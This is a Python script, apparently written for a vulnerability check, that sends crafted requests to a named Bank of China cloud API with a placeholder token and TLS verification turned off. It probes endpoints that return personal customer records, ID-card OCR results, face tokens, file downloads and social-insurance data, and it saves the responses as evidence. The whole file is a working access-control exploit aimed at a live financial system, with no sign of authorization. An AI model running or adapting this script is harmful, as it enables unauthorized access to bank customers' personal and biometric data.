#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""使用正确的TranCode格式重新验证"""
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = "https://dl.brcloud.bankofchina.com/dlydjd"
DEFAULT_TOKEN = "987654321"

# 真实spgKeys映射
SPG_KEYS = {
    "PMP_PROJ": "PMP-PROJ",
    "EC_SURVEYMGR": "EC-SURVEYMGR",
    "PROD_SOPE": "PROD-SOPE",
    "PROD_FLOW": "PROD-FLOW",
    "OMP_CMGR": "OMP-CMGR",
    "SOP_SERV": "SOP-SERV",
    "SOP_STYY": "SOP-STYY",
    "CUST_INFO": "CUST-INFO",
    "PROD_PSTR": "PROD-PSTR",
    "TRAD_OPRO": "TRAD-OPRO",
    "TRAD_RQUO": "TRAD-RQUO",
    "TRAD_SCAR": "TRAD-SCAR",
    "SSP_AUTH": "SSP-AUTH",
    "FOP_SERV": "FOP-SERV",
    "CUST_RELA": "CUST-RELA",
    "DELI_SPRO": "DELI-SPRO",
    "EC_FILE_MGR": "EC-FILE-MGR",
    "AGRE_AGRE": "AGRE-AGRE",
    "PAYM_PPRO": "PAYM-PPRO",
    "REP_SERV": "REP-SERV",
    "EC_IDEN": "EC-IDEN",
    "POSTER_MANAGEMENT": "POSTER-MANAGEMENT",
    "CHANNEL": "CHANNEL",
    "CUST_CSER": "CUST-CSER",
    "IMPLEMENT": "IMPLEMENT",
    "HOUSE_CREDIT": "HOUSE-CREDIT",
    "CHANNEL_MANAGE": "CHANNEL-MANAGE"
}

def create_session():
    session = requests.Session()
    session.trust_env = False
    session.proxies = {}
    return session

def call_api_real(session, tran_code, extra_body=None):
    """使用真实TranCode调用API"""
    url = f"{TARGET_URL}/sgp/transferRequest"
    headers = {
        "Content-Type": "application/json",
        "Authorization": DEFAULT_TOKEN,
        "User-Agent": "Mozilla/5.0"
    }

    body = {
        "Header": {
            "CurrentPageNum": 1,
            "PageTotalNum": 10,
            "NoRetCode": True,
            "BranchId": "800000",
            "LegalRepCode": "10000",
            "TranTeller": "",
            "TranCode": tran_code,
            "TranDate": "20260716",
            "TranTime": "120000000",
            "ServiceName": tran_code.split("-")[-1] if "-" in tran_code else tran_code,
            "ServiceCode": "D20190130",
            "AuthFlag": "0",
            "AuthrTellerNo": "1",
            "Channel": "39",
            "ConsumerId": "1",
            "GlobalSeq": "1",
            "GlobalSeqNo": "1",
            "KeyId": "1",
            "LocalLang": "1",
            "Mac": "1",
            "SourceSysId": "1111",
            "TerminalCode": "1121",
            "TranSeq": "1",
            "TranSeqNo": "1",
            "TranTellerNo": "1",
            "ExtendContent": "1",
            "TotalNum": "0"
        }
    }

    if extra_body:
        body.update(extra_body)

    try:
        resp = session.post(url, headers=headers, json=body, verify=False, timeout=30)
        return resp.json() if resp.status_code == 200 else {"error": f"HTTP {resp.status_code}", "text": resp.text[:500]}
    except Exception as e:
        return {"error": str(e)}

def main():
    print("="*70)
    print("使用正确TranCode重新验证漏洞")
    print("="*70)

    session = create_session()

    # 测试列表 - 各种模块的真实接口
    tests = [
        # 模块名, 接口描述, TranCode
        ("SSP-AUTH", "测试-已验证过的菜单接口", "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest"),

        # 客户信息模块
        ("CUST-INFO", "查询个人客户信息", "CUST-INFO/selectPersonCust"),
        ("CUST-INFO", "查询客户组件详情", "CUST-INFO/queryCustComponentDetail"),
        ("CUST-INFO", "查询客户请求详情", "CUST-INFO/queryCustRequestDetail"),
        ("CUST-INFO", "添加身份证信息", "CUST-INFO/addIdentificationCardInfo"),

        # 身份识别模块
        ("EC-IDEN", "查询订单列表", "EC-IDEN/queryOrderArray"),
        ("EC-IDEN", "查询订单详情", "EC-IDEN/queryOrderDetail"),
        ("EC-IDEN", "查询状态选项", "EC-IDEN/queryStatusOptions"),
        ("EC-IDEN", "获取OCR身份证结果", "EC-IDEN/getOcrIdCardResult"),
        ("EC-IDEN", "查询人脸Token", "EC-IDEN/queryFaceToken"),

        # 文件管理模块
        ("EC-FILE-MGR", "查询文件信息", "EC-FILE-MGR/queryFileInfo"),
        ("EC-FILE-MGR", "下载文件", "EC-FILE-MGR/downloadFile"),

        # 协议模块
        ("AGRE-AGRE", "查询协议类型列表", "AGRE-AGRE/queryAgreementTypeList"),
        ("AGRE-AGRE", "查询协议模板", "AGRE-AGRE/queryAgreementTemplateList"),

        # 客户关系
        ("CUST-RELA", "查询客户关系", "CUST-RELA/queryCustRelationList"),

        # 实施模块
        ("IMPLEMENT", "社保数据查询", "IMPLEMENT/socInsDataQuery"),
        ("IMPLEMENT", "获取人脸结果", "IMPLEMENT/getPersonFaceResult"),

        # 支付模块
        ("PAYM-PPRO", "查询支付产品", "PAYM-PPRO/queryPaymProduct"),
    ]

    results = []
    for module, desc, tran_code in tests:
        result = call_api_real(session, tran_code)
        ret_code = result.get("Header", {}).get("RetCode", "未知")
        ret_msg = result.get("Header", {}).get("RetMsg", "未知")

        # 判断成功
        is_success = ret_code == "000000"

        results.append({
            "module": module,
            "desc": desc,
            "tran_code": tran_code,
            "ret_code": ret_code,
            "ret_msg": ret_msg,
            "is_success": is_success,
            "response_data": result
        })

        # 打印简要结果
        status = "✅" if is_success else "❌"
        print(f"{status} {module:20} {desc:30} → {ret_code} {ret_msg[:30]}")

    # 统计
    print("\n" + "="*70)
    print("统计")
    print("="*70)
    success_count = sum(1 for r in results if r["is_success"])
    error_codes = {}
    for r in results:
        if not r["is_success"]:
            code = r["ret_code"]
            error_codes[code] = error_codes.get(code, 0) + 1

    print(f"成功: {success_count}/{len(results)}")
    print(f"失败错误码分布:")
    for code, count in error_codes.items():
        print(f"  {code}: {count} 次")

    # 详细输出成功的结果
    print("\n" + "="*70)
    print("成功调用的API详情")
    print("="*70)
    for r in results:
        if r["is_success"]:
            print(f"\n[成功] {r['tran_code']}")
            print(f"  描述: {r['desc']}")
            print(f"  模块: {r['module']}")
            data = r["response_data"]
            if "data" in data:
                data_content = json.dumps(data["data"], ensure_ascii=False)
                print(f"  返回数据: {data_content[:500]}")

    # 详细输出失败但有意义的
    print("\n" + "="*70)
    print("失败API的错误信息(可能是路由问题)")
    print("="*70)
    for r in results:
        if not r["is_success"]:
            print(f"\n{r['tran_code']}: {r['ret_msg']}")

    # 保存证据
    with open("vuln_evidence/correct_trancode_test.json", "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False, default=str)
    print(f"\n✅ 完整结果已保存到: vuln_evidence/correct_trancode_test.json")

if __name__ == "__main__":
    main()